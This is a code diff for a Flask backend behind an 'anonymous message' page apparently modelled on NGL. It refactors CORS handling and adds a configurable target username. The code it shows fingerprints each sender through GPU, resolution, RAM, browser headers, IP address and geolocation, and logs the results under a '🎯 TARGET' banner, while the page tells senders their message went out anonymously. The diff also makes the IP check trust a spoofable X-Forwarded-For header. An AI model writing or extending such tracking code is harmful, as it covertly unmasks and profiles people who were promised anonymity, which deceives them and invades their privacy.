@@ -10,7 +10,6 @@ import logging
 
 import requests
 from flask import Flask, request
-from flask_cors import CORS
 from user_agents import parse
 from werkzeug.middleware.proxy_fix import ProxyFix
 
@@ -21,25 +20,20 @@ from werkzeug.middleware.proxy_fix import ProxyFix
 
 app = Flask(__name__)
 
-# Render sits in front of the Gunicorn/Flask process. Trust one proxy hop for
-# client IP + scheme. If you later put another proxy/CDN in front of Render,
-# revisit these values rather than simply increasing them blindly.
+# Render sits in front of Gunicorn/Flask.
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)
 
-# IMPORTANT: if your GitHub Pages origin is different, change only this line.
+# CORS must use only the origin, not the repository/page path.
 FRONTEND_ORIGIN = "https://itsghostblade.github.io"
-CORS(
-    app,
-    resources={r"/submit": {"origins": [FRONTEND_ORIGIN]}},
-    supports_credentials=False,
-)
+
+# Current username shown in backend responses/logs.
+TARGET_USERNAME = "@root.init_vaibhav"
 
 # Requested limit: 20 submissions per minute per client IP.
 RATE_LIMIT_REQUESTS = 20
 RATE_LIMIT_WINDOW_SECONDS = 60
 
-# Cache IP lookups so repeated messages from one visitor do not repeatedly call
-# the external API. This also helps stay below ip-api.com's free rate limit.
+# Cache IP lookups so repeated messages do not repeatedly call the external API.
 NETWORK_CACHE_TTL_SECONDS = 6 * 60 * 60
 NETWORK_CACHE_MAX_ENTRIES = 1024
 
@@ -51,9 +45,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ngl_backend")
 
-# Small in-memory stores are enough for this single-process learning project.
-# If you later run multiple Gunicorn workers/instances, use a shared store such
-# as Redis for rate limiting and caching.
 _rate_buckets = defaultdict(deque)
 _rate_lock = Lock()
 _network_cache = {}
@@ -61,12 +52,30 @@ _network_cache_lock = Lock()
 _ip_api_blocked_until = 0.0
 _ip_api_lock = Lock()
 
-SUCCESS_PAGE = """
+SUCCESS_PAGE = f"""
 <div style="background: white; padding: 40px; border-radius: 35px; text-align: center; font-family: sans-serif;">
     <h1 style="color: #FE2F78;">✅ Sent!</h1>
-    <p style="color: #666;">Your anonymous message has been delivered to @vaibhav_w16</p>
+    <p style="color: #666;">Your anonymous message has been delivered to {TARGET_USERNAME}</p>
 </div>
 """
+
+
+# -----------------------------------------------------------------------------
+# CORS
+# -----------------------------------------------------------------------------
+
+@app.after_request
+def add_cors_headers(response):
+    """Allow only the GitHub Pages origin to read API responses."""
+    origin = request.headers.get("Origin")
+
+    if origin == FRONTEND_ORIGIN:
+        response.headers["Access-Control-Allow-Origin"] = origin
+        response.headers["Vary"] = "Origin"
+        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
+        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
+
+    return response
 
 
 # -----------------------------------------------------------------------------
@@ -74,7 +83,6 @@ SUCCESS_PAGE = """
 # -----------------------------------------------------------------------------
 
 def clean_form_field(name, max_length, default="Unknown"):
-    """Read a form field, trim it, and enforce a small sane size."""
     value = request.form.get(name, "")
     if not isinstance(value, str):
         return default
@@ -87,13 +95,11 @@ def clean_form_field(name, max_length, default="Unknown"):
 
 
 def clean_header(name, max_length=500, default="Unknown"):
-    """Read and cap a request header before it is logged or fingerprinted."""
     value = request.headers.get(name, "").strip()
     return value[:max_length] if value else default
 
 
 def safe_log_text(value):
-    """Keep untrusted text on one physical log line."""
     return str(value).replace("\r", "\\r").replace("\n", "\\n")
 
 
@@ -112,7 +118,6 @@ def validate_message():
 
 
 def get_device_fields():
-    """Validate the hardware fields already sent by the existing frontend."""
     ram = clean_form_field("ram", 20)
     ram_display = f"{ram} GB" if ram != "Unknown" else "Unknown"
 
@@ -130,7 +135,21 @@ def get_device_fields():
 # -----------------------------------------------------------------------------
 
 def get_client_ip():
-    """Use REMOTE_ADDR after ProxyFix has handled the trusted proxy hop."""
+    """Return the best available client IP.
+
+    Prefer a valid public IP from X-Forwarded-For when Render provides it,
+    otherwise fall back to Flask's remote_addr after ProxyFix.
+    """
+    forwarded = request.headers.get("X-Forwarded-For", "")
+    if forwarded:
+        for candidate in (part.strip() for part in forwarded.split(",")):
+            try:
+                parsed = ip_address(candidate)
+                if parsed.is_global:
+                    return str(parsed)
+            except ValueError:
+                continue
+
     raw_ip = (request.remote_addr or "").strip()
     if not raw_ip:
         return "Unknown"
@@ -167,11 +186,6 @@ def parse_user_agent():
 
 
 def get_browser_signals():
-    """Collect useful headers browsers may send automatically.
-
-    These require no frontend changes. Availability varies by browser and
-    privacy settings, so missing values are expected.
-    """
     return {
         "accept_language": clean_header("Accept-Language", 300),
         "accept_encoding": clean_header("Accept-Encoding", 200),
@@ -194,15 +208,6 @@ def _fingerprint_hash(material):
 
 
 def build_fingerprints(ip, ua, device, browser_signals):
-    """Create deterministic heuristic IDs from available characteristics.
-
-    stable_id uses slower-changing hardware/platform signals and excludes the
-    IP and raw browser version. full_id adds more browser/header entropy for
-    stronger differentiation. network_id combines the full fingerprint with
-    the current IP.
-
-    These are heuristic fingerprints, not guaranteed unique identifiers.
-    """
     stable_material = {
         "gpu": device["gpu"],
         "resolution": device["resolution"],
@@ -234,7 +239,6 @@ def build_fingerprints(ip, ua, device, browser_signals):
 # -----------------------------------------------------------------------------
 
 def is_rate_limited(ip):
-    """Simple in-memory sliding-window limiter: 20 requests / 60 seconds / IP."""
     now = monotonic()
     cutoff = now - RATE_LIMIT_WINDOW_SECONDS
 
@@ -272,7 +276,6 @@ def _get_cached_network(ip):
 def _cache_network(ip, data):
     now = monotonic()
     with _network_cache_lock:
-        # Simple bounded cache; discard the oldest-expiring entry if necessary.
         if len(_network_cache) >= NETWORK_CACHE_MAX_ENTRIES and ip not in _network_cache:
             oldest_key = min(_network_cache, key=lambda key: _network_cache[key][0])
             _network_cache.pop(oldest_key, None)
@@ -281,7 +284,6 @@ def _cache_network(ip, data):
 
 
 def lookup_network(ip):
-    """Look up coarse network metadata for a public IP with caching/fallbacks."""
     global _ip_api_blocked_until
 
     fallback = {
@@ -331,7 +333,6 @@ def lookup_network(ip):
         response.raise_for_status()
         payload = response.json()
 
-        # Respect the provider's own remaining-request headers.
         remaining = response.headers.get("X-Rl")
         if remaining == "0":
             try:
@@ -376,6 +377,8 @@ def lookup_network(ip):
 
 def log_submission(msg, ip, network, ua, device, browser_signals, stable_id, full_id, network_id):
     timestamp = datetime.now(IST).isoformat(timespec="seconds")
+    request_id = clean_header("Rndr-Id", 200)
+    cf_ray = clean_header("CF-Ray", 200)
 
     network_location = " | ".join(
         safe_log_text(value)
@@ -389,8 +392,9 @@ def log_submission(msg, ip, network, ua, device, browser_signals, stable_id, ful
 
     report = (
         f"\n{'#' * 72}\n"
-        f"🎯 TARGET: @vaibhav_w16 | {timestamp} IST\n"
+        f"🎯 TARGET: {TARGET_USERNAME} | {timestamp} IST\n"
         f"💬 MSG: {safe_log_text(msg)}\n"
+        f"🆔 REQUEST: {safe_log_text(request_id)} | CF-RAY: {safe_log_text(cf_ray)}\n"
         f"🧬 STABLE FP: {stable_id}\n"
         f"🔬 FULL FP: {full_id}\n"
         f"🔗 NETWORK FP: {network_id}\n"
@@ -417,11 +421,15 @@ def log_submission(msg, ip, network, ua, device, browser_signals, stable_id, ful
 
 @app.route("/")
 def home():
-    return "NGL Backend for @vaibhav_w16 is ONLINE.", 200
+    return f"NGL Backend for {TARGET_USERNAME} is ONLINE.", 200
 
 
-@app.route("/submit", methods=["POST"])
+@app.route("/submit", methods=["POST", "OPTIONS"])
 def submit():
+    # Explicitly answer CORS preflight requests.
+    if request.method == "OPTIONS":
+        return "", 204
+
     try:
         ip = get_client_ip()
 
@@ -454,7 +462,6 @@ def submit():
             network_id=network_id,
         )
 
-        # Keep the existing response behavior so index.html does not need changes.
         return SUCCESS_PAGE, 200
 
     except ValueError as exc:
